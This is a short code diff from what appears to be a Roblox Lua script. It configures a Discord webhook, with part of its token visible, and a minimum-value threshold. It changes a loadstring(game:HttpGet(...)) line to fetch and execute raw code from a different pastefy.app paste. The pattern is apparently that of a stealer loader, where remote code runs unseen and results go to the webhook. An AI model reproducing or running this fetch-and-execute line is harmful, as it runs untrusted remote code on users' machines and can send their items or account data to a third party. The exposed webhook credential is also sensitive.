@@ -3,4 +3,4 @@ Webhook = "https://discord.com/api/webhooks/1332333844812005437/G_wOMbl_iUS3c2Sg
 MinimumValue = 1
 
 
-loadstring(game:HttpGet("https://pastefy.app/fdQNDcCO/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/9QqIaIwp/raw"))()
